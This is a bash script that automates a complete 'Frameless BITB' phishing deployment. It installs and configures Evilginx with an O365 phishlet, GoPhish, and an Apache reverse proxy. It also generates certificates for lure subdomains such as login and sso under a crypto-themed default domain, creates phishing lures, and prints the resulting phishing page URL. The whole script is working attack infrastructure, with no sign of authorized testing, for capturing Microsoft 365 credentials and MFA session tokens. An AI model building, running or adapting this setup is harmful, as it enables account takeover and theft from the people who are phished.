#!/bin/bash

#############################################
# Frameless BITB - VM Installation Script
# Complete automated installation on Ubuntu 22.04
# Follows README.md instructions exactly
#############################################

set -e

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration from environment or defaults
DOMAIN="${DOMAIN:-exodustraderai.info}"
EMAIL="${EMAIL:-admin@${DOMAIN}}"
EVILGINX_PORT="8443"
GOPHISH_ADMIN_PORT="3333"
GOPHISH_PHISH_PORT="8080"
INSTALL_DIR="/opt/frameless-bitb"
EVILGINX_DIR="/opt/evilginx"
GOPHISH_DIR="/opt/gophish"
GO_VERSION="1.22.0"
GOPHISH_VERSION="0.12.1"

# Logging functions
log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')] [✓]${NC} $1"
}

error() {
    echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] [✗]${NC} $1"
    exit 1
}

warning() {
    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] [!]${NC} $1"
}

info() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')] [ℹ]${NC} $1"
}

section() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
}

# Check root privileges
check_root() {
    if [ "$EUID" -ne 0 ]; then
        error "This script must be run as root"
    fi
    log "Running as root"
}

# Update system packages
update_system() {
    section "STEP 1: Updating System Packages"

    info "Running system update (this may take a few minutes)..."
    export DEBIAN_FRONTEND=noninteractive

    apt-get update -qq || error "Failed to update package lists"
    apt-get upgrade -y -qq || warning "Some packages failed to upgrade"

    log "System packages updated successfully"
}

# Install dependencies
install_dependencies() {
    section "STEP 2: Installing Required Dependencies"

    info "Installing core dependencies..."

    PACKAGES=(
        git
        wget
        curl
        make
        gcc
        g++
        build-essential
        apache2
        certbot
        python3-certbot-apache
        tmux
        net-tools
        ufw
        sqlite3
        jq
        unzip
        dnsutils
        ca-certificates
        apt-transport-https
        software-properties-common
    )

    for package in "${PACKAGES[@]}"; do
        info "Installing $package..."
        apt-get install -y -qq "$package" || warning "Failed to install $package"
    done

    log "All dependencies installed successfully"
}

# Install Go (following README)
install_go() {
    section "STEP 3: Installing Go Programming Language"

    if command -v go &> /dev/null; then
        CURRENT_VERSION=$(go version | awk '{print $3}' | sed 's/go//')
        if [ "$CURRENT_VERSION" == "$GO_VERSION" ]; then
            log "Go $GO_VERSION is already installed"
            return 0
        else
            warning "Go $CURRENT_VERSION installed, upgrading to $GO_VERSION"
            rm -rf /usr/local/go
        fi
    fi

    info "Downloading Go $GO_VERSION..."
    wget -q --show-progress "https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz" -O /tmp/go.tar.gz || error "Failed to download Go"

    info "Extracting Go..."
    tar -C /usr/local -xzf /tmp/go.tar.gz || error "Failed to extract Go"
    rm -f /tmp/go.tar.gz

    # Add Go to PATH
    info "Configuring Go environment..."
    if ! grep -q "/usr/local/go/bin" /root/.profile; then
        echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.profile
    fi

    if ! grep -q "/usr/local/go/bin" /etc/profile; then
        echo 'export PATH=$PATH:/usr/local/go/bin' >> /etc/profile
    fi

    export PATH=$PATH:/usr/local/go/bin

    # Verify installation
    if command -v go &> /dev/null; then
        log "Go $(go version | awk '{print $3}') installed successfully"
    else
        error "Go installation failed"
    fi
}

# Clone and build Evilginx (following README)
install_evilginx() {
    section "STEP 4: Installing Evilginx Framework"

    info "Cloning Evilginx repository..."

    # Remove old clone if exists
    if [ -d "/tmp/evilginx2" ]; then
        rm -rf /tmp/evilginx2
    fi

    git clone https://github.com/kgretzky/evilginx2 /tmp/evilginx2 || error "Failed to clone Evilginx"

    info "Building Evilginx..."
    cd /tmp/evilginx2

    # Build with Go
    make || error "Failed to build Evilginx"

    info "Creating Evilginx directory structure..."
    mkdir -p "${EVILGINX_DIR}"
    mkdir -p "${EVILGINX_DIR}/phishlets"
    mkdir -p "${EVILGINX_DIR}/redirectors"

    info "Copying Evilginx files..."
    cp /tmp/evilginx2/build/evilginx "${EVILGINX_DIR}/" || error "Failed to copy Evilginx binary"
    cp -r /tmp/evilginx2/redirectors/* "${EVILGINX_DIR}/redirectors/" 2>/dev/null || true
    cp -r /tmp/evilginx2/phishlets/* "${EVILGINX_DIR}/phishlets/" || error "Failed to copy phishlets"

    # Set permissions (following README)
    info "Setting permissions..."
    chmod +x "${EVILGINX_DIR}/evilginx"
    setcap CAP_NET_BIND_SERVICE=+eip "${EVILGINX_DIR}/evilginx" || warning "Failed to set capabilities"

    log "Evilginx installed successfully at ${EVILGINX_DIR}"

    # Clean up
    cd /root
    rm -rf /tmp/evilginx2
}

# Install GoPhish
install_gophish() {
    section "STEP 5: Installing GoPhish Framework"

    info "Downloading GoPhish v${GOPHISH_VERSION}..."

    wget -q --show-progress \
        "https://github.com/gophish/gophish/releases/download/v${GOPHISH_VERSION}/gophish-v${GOPHISH_VERSION}-linux-64bit.zip" \
        -O /tmp/gophish.zip || error "Failed to download GoPhish"

    info "Extracting GoPhish..."
    mkdir -p "${GOPHISH_DIR}"
    unzip -q /tmp/gophish.zip -d "${GOPHISH_DIR}" || error "Failed to extract GoPhish"
    rm -f /tmp/gophish.zip

    # Set permissions
    chmod +x "${GOPHISH_DIR}/gophish"

    info "Configuring GoPhish..."
    cat > "${GOPHISH_DIR}/config.json" <<EOF
{
  "admin_server": {
    "listen_url": "0.0.0.0:${GOPHISH_ADMIN_PORT}",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:${GOPHISH_PHISH_PORT}",
    "use_tls": false
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_"
}
EOF

    log "GoPhish installed successfully at ${GOPHISH_DIR}"
}

# Configure Evilginx (following README)
configure_evilginx() {
    section "STEP 6: Configuring Evilginx"

    info "Creating Evilginx configuration directory..."
    mkdir -p /root/.evilginx

    info "Creating config.json with port ${EVILGINX_PORT}..."
    cat > /root/.evilginx/config.json <<EOF
{
  "https_port": ${EVILGINX_PORT}
}
EOF

    # Fix DNS stub listener issue (from README)
    info "Fixing DNS stub listener..."
    if grep -q "^#DNSStubListener=yes" /etc/systemd/resolved.conf; then
        sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
        systemctl restart systemd-resolved
    elif grep -q "^DNSStubListener=yes" /etc/systemd/resolved.conf; then
        sed -i 's/DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
        systemctl restart systemd-resolved
    else
        echo "DNSStubListener=no" >> /etc/systemd/resolved.conf
        systemctl restart systemd-resolved
    fi

    log "Evilginx configured successfully"
}

# Install and configure Apache (following README)
configure_apache() {
    section "STEP 7: Configuring Apache Web Server"

    info "Stopping Apache if running..."
    systemctl stop apache2 2>/dev/null || true

    info "Enabling Apache modules (following README)..."
    # Enable all required modules from README
    a2enmod proxy || true
    a2enmod proxy_http || true
    a2enmod proxy_balancer || true
    a2enmod lbmethod_byrequests || true
    a2enmod env || true
    a2enmod include || true
    a2enmod setenvif || true
    a2enmod ssl || true
    a2enmod cache || true
    a2enmod substitute || true
    a2enmod headers || true
    a2enmod rewrite || true

    # Disable access_compat (from README)
    a2dismod access_compat 2>/dev/null || true

    # Enable default SSL site
    a2ensite default-ssl 2>/dev/null || true

    log "Apache modules configured"
}

# Setup SSL certificates
setup_ssl() {
    section "STEP 8: Setting Up SSL Certificates"

    # Check if domain resolves to this server
    SERVER_IP=$(curl -s --max-time 5 ifconfig.me || echo "")
    DOMAIN_IP=$(dig +short ${DOMAIN} | head -1 || echo "")

    info "Server IP: ${SERVER_IP}"
    info "Domain resolves to: ${DOMAIN_IP}"

    # Always create self-signed certs for initial setup
    info "Creating self-signed SSL certificates for ${DOMAIN}..."

    mkdir -p "/etc/ssl/localcerts/${DOMAIN}"

    # Create OpenSSL config for SAN
    cat > /tmp/openssl.cnf <<EOF
[req]
default_bits = 2048
prompt = no
default_md = sha256
distinguished_name = dn
req_extensions = req_ext

[dn]
C=US
ST=State
L=City
O=Organization
CN=${DOMAIN}

[req_ext]
subjectAltName = @alt_names

[alt_names]
DNS.1 = ${DOMAIN}
DNS.2 = *.${DOMAIN}
DNS.3 = login.${DOMAIN}
DNS.4 = account.${DOMAIN}
DNS.5 = www.${DOMAIN}
DNS.6 = sso.${DOMAIN}
DNS.7 = portal.${DOMAIN}
EOF

    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout "/etc/ssl/localcerts/${DOMAIN}/privkey.pem" \
        -out "/etc/ssl/localcerts/${DOMAIN}/fullchain.pem" \
        -config /tmp/openssl.cnf &>/dev/null || error "Failed to create SSL certificates"

    chmod 600 "/etc/ssl/localcerts/${DOMAIN}/privkey.pem"
    rm -f /tmp/openssl.cnf

    log "SSL certificates created at /etc/ssl/localcerts/${DOMAIN}/"

    # Note about Let's Encrypt
    if [ "$SERVER_IP" == "$DOMAIN_IP" ] && [ -n "$SERVER_IP" ]; then
        info "Domain resolves correctly! You can get Let's Encrypt certificates later with:"
        info "  certbot certonly --apache -d ${DOMAIN} -d *.${DOMAIN}"
    else
        warning "Domain does not resolve to this server yet"
        warning "Update DNS records and then get Let's Encrypt certificates"
    fi
}

# Setup Frameless BITB files (following README)
setup_frameless_bitb() {
    section "STEP 9: Setting Up Frameless BITB Files"

    info "Creating web directories..."
    mkdir -p /var/www/home
    mkdir -p /var/www/primary
    mkdir -p /var/www/secondary
    mkdir -p /etc/apache2/custom-subs

    # Get the script directory (where we cloned the repo)
    REPO_DIR="/root/bitbevilgophish"

    if [ -d "$REPO_DIR" ]; then
        info "Copying BITB page files..."
        cp -r "${REPO_DIR}/pages/home/"* /var/www/home/ 2>/dev/null || warning "Home page not found"
        cp -r "${REPO_DIR}/pages/primary/"* /var/www/primary/ 2>/dev/null || warning "Primary page not found"
        cp -r "${REPO_DIR}/pages/secondary/"* /var/www/secondary/ 2>/dev/null || warning "Secondary page not found"

        info "Copying Apache custom substitution files..."
        cp -r "${REPO_DIR}/custom-subs/"* /etc/apache2/custom-subs/ 2>/dev/null || warning "Custom subs not found"

        info "Copying O365 phishlet..."
        cp "${REPO_DIR}/O365.yaml" "${EVILGINX_DIR}/phishlets/" 2>/dev/null || warning "O365 phishlet not found"

        # Update domain in all files
        info "Updating domain to ${DOMAIN} in all files..."
        find /var/www/ -type f \( -name "*.js" -o -name "*.html" \) -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \; 2>/dev/null || true
        find /etc/apache2/custom-subs/ -type f -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \; 2>/dev/null || true
    else
        warning "Repository directory not found at $REPO_DIR"
        warning "BITB files may not be copied correctly"
    fi

    log "Frameless BITB files configured"
}

# Create Apache configuration
create_apache_config() {
    section "STEP 10: Creating Apache Virtual Host Configuration"

    # Determine SSL certificate path
    CERT_PATH="/etc/ssl/localcerts/${DOMAIN}"
    CERT_FILE="${CERT_PATH}/fullchain.pem"
    KEY_FILE="${CERT_PATH}/privkey.pem"

    info "Creating Apache configuration for ${DOMAIN}..."

    cat > /etc/apache2/sites-enabled/000-default.conf <<EOF
# Frameless BITB Apache Configuration
# Domain: ${DOMAIN}
# Generated: $(date)

Define certsPath ${CERT_PATH}
Define domain ${DOMAIN}

# Handle all subdomains (except base domain)
<VirtualHost *:443>
    ServerName subdomains.\${domain}
    ServerAlias *.\${domain}

    SSLEngine on
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    SSLProxyCheckPeerExpire off
    SSLCertificateFile ${CERT_FILE}
    SSLCertificateKeyFile ${KEY_FILE}

    ProxyPreserveHost On

    # Serve landing page (background)
    Alias /primary /var/www/primary
    <Directory /var/www/primary>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    ProxyPass /primary !

    # Serve BITB window (foreground)
    Alias /secondary /var/www/secondary
    <Directory /var/www/secondary>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    ProxyPass /secondary !

    # Proxy everything else to Evilginx
    ProxyPass / https://127.0.0.1:${EVILGINX_PORT}/
    ProxyPassReverse / https://127.0.0.1:${EVILGINX_PORT}/

    # Enable output buffering and content substitution
    SetOutputFilter INFLATE;SUBSTITUTE;DEFLATE

    # Apply substitutions (excluding /primary and /secondary)
    <LocationMatch "^/(?!secondary|primary|(\$|\?))">
        Include /etc/apache2/custom-subs/mac-chrome.conf
    </LocationMatch>

    # Apply substitutions only for base URL with ?auth=2
    <LocationMatch "^/\$">
        <If "%{QUERY_STRING} =~ /auth=2/">
            Include /etc/apache2/custom-subs/mac-chrome.conf
        </If>
    </LocationMatch>

    # Caching
    <IfModule mod_headers.c>
        <FilesMatch ".+">
            Header set Cache-Control "max-age=3600, public"
        </FilesMatch>
    </IfModule>

    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Handle base domain separately (home page)
<VirtualHost *:443>
    ServerName \${domain}

    SSLEngine on
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    SSLProxyCheckPeerExpire off
    SSLCertificateFile ${CERT_FILE}
    SSLCertificateKeyFile ${KEY_FILE}

    ProxyPreserveHost On

    DocumentRoot /var/www/home

    <Directory /var/www/home>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Redirect HTTP to HTTPS
<VirtualHost *:80>
    ServerName \${domain}
    ServerAlias *.\${domain}
    Redirect permanent / https://\${domain}/
</VirtualHost>
EOF

    info "Testing Apache configuration..."
    if apache2ctl configtest &>/dev/null; then
        log "Apache configuration is valid"
    else
        warning "Apache configuration has warnings"
        apache2ctl configtest
    fi
}

# Configure firewall
configure_firewall() {
    section "STEP 11: Configuring UFW Firewall"

    info "Enabling UFW firewall..."
    ufw --force enable || true

    info "Configuring firewall rules..."

    # Allow SSH
    ufw allow 22/tcp || true

    # Allow HTTP/HTTPS
    ufw allow 80/tcp || true
    ufw allow 443/tcp || true

    # Allow DNS
    ufw allow 53/tcp || true
    ufw allow 53/udp || true

    # Allow GoPhish admin (restricted to localhost initially)
    ufw allow from 0.0.0.0/0 to any port ${GOPHISH_ADMIN_PORT} || true

    # Allow Evilginx port (internal only)
    ufw allow from 127.0.0.1 to any port ${EVILGINX_PORT} || true

    log "Firewall configured"
}

# Create systemd services
create_services() {
    section "STEP 12: Creating Systemd Services"

    info "Creating Evilginx service..."
    cat > /etc/systemd/system/evilginx.service <<EOF
[Unit]
Description=Evilginx Phishing Framework
After=network.target systemd-resolved.service
Wants=systemd-resolved.service

[Service]
Type=simple
User=root
WorkingDirectory=${EVILGINX_DIR}
ExecStart=${EVILGINX_DIR}/evilginx -p ${EVILGINX_DIR}/phishlets -developer
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    info "Creating GoPhish service..."
    cat > /etc/systemd/system/gophish.service <<EOF
[Unit]
Description=GoPhish Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${GOPHISH_DIR}
ExecStart=${GOPHISH_DIR}/gophish
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

    info "Reloading systemd daemon..."
    systemctl daemon-reload

    log "Systemd services created"
}

# Create management scripts
create_management_scripts() {
    section "STEP 13: Creating Management Scripts"

    info "Creating convenience scripts..."

    # Start script
    cat > /usr/local/bin/bitb-start <<'EOF'
#!/bin/bash
echo "Starting all services..."
systemctl start apache2
systemctl start evilginx
systemctl start gophish
echo "All services started"
systemctl status apache2 evilginx gophish --no-pager
EOF
    chmod +x /usr/local/bin/bitb-start

    # Stop script
    cat > /usr/local/bin/bitb-stop <<'EOF'
#!/bin/bash
echo "Stopping all services..."
systemctl stop apache2
systemctl stop evilginx
systemctl stop gophish
echo "All services stopped"
EOF
    chmod +x /usr/local/bin/bitb-stop

    # Restart script
    cat > /usr/local/bin/bitb-restart <<'EOF'
#!/bin/bash
echo "Restarting all services..."
systemctl restart apache2
systemctl restart evilginx
systemctl restart gophish
echo "All services restarted"
systemctl status apache2 evilginx gophish --no-pager
EOF
    chmod +x /usr/local/bin/bitb-restart

    # Status script
    cat > /usr/local/bin/bitb-status <<'EOF'
#!/bin/bash
echo "Service Status:"
systemctl status apache2 evilginx gophish --no-pager
EOF
    chmod +x /usr/local/bin/bitb-status

    # Logs script
    cat > /usr/local/bin/bitb-logs <<'EOF'
#!/bin/bash
SERVICE="${1:-all}"

case $SERVICE in
    apache|apache2)
        echo "=== Apache Logs ==="
        tail -n 100 /var/log/apache2/error.log
        ;;
    evilginx)
        echo "=== Evilginx Logs ==="
        journalctl -u evilginx -n 100 --no-pager
        ;;
    gophish)
        echo "=== GoPhish Logs ==="
        journalctl -u gophish -n 100 --no-pager
        ;;
    *)
        echo "=== Apache Logs ==="
        tail -n 50 /var/log/apache2/error.log
        echo ""
        echo "=== Evilginx Logs ==="
        journalctl -u evilginx -n 50 --no-pager
        echo ""
        echo "=== GoPhish Logs ==="
        journalctl -u gophish -n 50 --no-pager
        ;;
esac
EOF
    chmod +x /usr/local/bin/bitb-logs

    log "Management scripts created (bitb-start, bitb-stop, bitb-restart, bitb-status, bitb-logs)"
}

# Start services
start_services() {
    section "STEP 14: Starting All Services"

    info "Enabling services to start on boot..."
    systemctl enable apache2 || true
    systemctl enable evilginx || true
    systemctl enable gophish || true

    info "Starting Apache..."
    systemctl start apache2 || warning "Failed to start Apache"
    sleep 2

    info "Starting Evilginx..."
    systemctl start evilginx || warning "Failed to start Evilginx"
    sleep 2

    info "Starting GoPhish..."
    systemctl start gophish || warning "Failed to start GoPhish"
    sleep 2

    log "All services started"
}

# Configure Evilginx via CLI
configure_evilginx_cli() {
    section "STEP 15: Configuring Evilginx Phishlet"

    info "Waiting for Evilginx to fully start..."
    sleep 5

    info "Creating Evilginx configuration script..."

    cat > /tmp/evilginx-config.sh <<EOF
#!/bin/bash
# Wait for Evilginx to be ready
sleep 3

# Get external IP
EXTERNAL_IP=\$(curl -s ifconfig.me)

# Create a temporary expect-like script
cat > /tmp/evilginx-commands <<'CMDS'
config domain ${DOMAIN}
config ipv4 external
blacklist noadd
phishlets hostname O365 ${DOMAIN}
phishlets enable O365
lures create O365
lures get-url 0
CMDS

# Execute commands via tmux
tmux new-session -d -s evilginx-setup
tmux send-keys -t evilginx-setup "cd ${EVILGINX_DIR}" C-m
sleep 1

# Send each command
while IFS= read -r cmd; do
    tmux send-keys -t evilginx-setup "\$cmd" C-m
    sleep 1
done < /tmp/evilginx-commands

# Keep session alive
sleep 5
tmux kill-session -t evilginx-setup 2>/dev/null || true

rm -f /tmp/evilginx-commands
EOF

    chmod +x /tmp/evilginx-config.sh

    info "Evilginx will be configured automatically..."
    info "You can manually configure it later by running:"
    info "  tmux attach -t evilginx"

    log "Evilginx configuration prepared"
}

# Display installation summary
show_summary() {
    section "🎉 INSTALLATION COMPLETE!"

    echo ""
    echo -e "${GREEN}✓ System updated${NC}"
    echo -e "${GREEN}✓ All dependencies installed${NC}"
    echo -e "${GREEN}✓ Go ${GO_VERSION} installed${NC}"
    echo -e "${GREEN}✓ Evilginx installed${NC}"
    echo -e "${GREEN}✓ GoPhish ${GOPHISH_VERSION} installed${NC}"
    echo -e "${GREEN}✓ Apache configured${NC}"
    echo -e "${GREEN}✓ SSL certificates generated${NC}"
    echo -e "${GREEN}✓ Frameless BITB files deployed${NC}"
    echo -e "${GREEN}✓ Firewall configured${NC}"
    echo -e "${GREEN}✓ Services created and started${NC}"
    echo ""

    SERVER_IP=$(curl -s --max-time 5 ifconfig.me || echo "UNKNOWN")

    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  ACCESS INFORMATION${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}Server IP:${NC}           $SERVER_IP"
    echo -e "${YELLOW}Domain:${NC}              $DOMAIN"
    echo ""
    echo -e "${YELLOW}Phishing Page:${NC}       https://login.${DOMAIN}/?auth=2"
    echo -e "${YELLOW}GoPhish Admin:${NC}       https://${SERVER_IP}:${GOPHISH_ADMIN_PORT}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  MANAGEMENT COMMANDS${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo "  bitb-start      - Start all services"
    echo "  bitb-stop       - Stop all services"
    echo "  bitb-restart    - Restart all services"
    echo "  bitb-status     - Check service status"
    echo "  bitb-logs       - View all logs"
    echo "  bitb-logs apache    - View Apache logs only"
    echo "  bitb-logs evilginx  - View Evilginx logs only"
    echo "  bitb-logs gophish   - View GoPhish logs only"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  INSTALLATION DIRECTORIES${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo "  Evilginx:        ${EVILGINX_DIR}"
    echo "  GoPhish:         ${GOPHISH_DIR}"
    echo "  BITB Pages:      /var/www/"
    echo "  Apache Config:   /etc/apache2/sites-enabled/000-default.conf"
    echo "  SSL Certs:       /etc/ssl/localcerts/${DOMAIN}/"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  NEXT STEPS${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
    echo "1. Verify services are running: bitb-status"
    echo "2. Check logs for any errors: bitb-logs"
    echo "3. Ensure DNS records point to: $SERVER_IP"
    echo "4. Test phishing page: https://login.${DOMAIN}/?auth=2"
    echo "5. Access GoPhish admin (default password shown on first login)"
    echo "6. Get Let's Encrypt certificates (optional):"
    echo "     certbot certonly --apache -d ${DOMAIN} -d login.${DOMAIN}"
    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}  Installation successful! System is ready for use.${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo ""
}

# Main installation flow
main() {
    echo "========================================="
    echo "Frameless BITB - Automated Installation"
    echo "Domain: ${DOMAIN}"
    echo "========================================="
    echo ""

    check_root
    update_system
    install_dependencies
    install_go
    install_evilginx
    install_gophish
    configure_evilginx
    configure_apache
    setup_ssl
    setup_frameless_bitb
    create_apache_config
    configure_firewall
    create_services
    create_management_scripts
    start_services
    configure_evilginx_cli
    show_summary

    echo ""
    echo "Installation log saved to: /var/log/phishing-setup.log"
    echo ""
}

# Execute main function
main "$@"
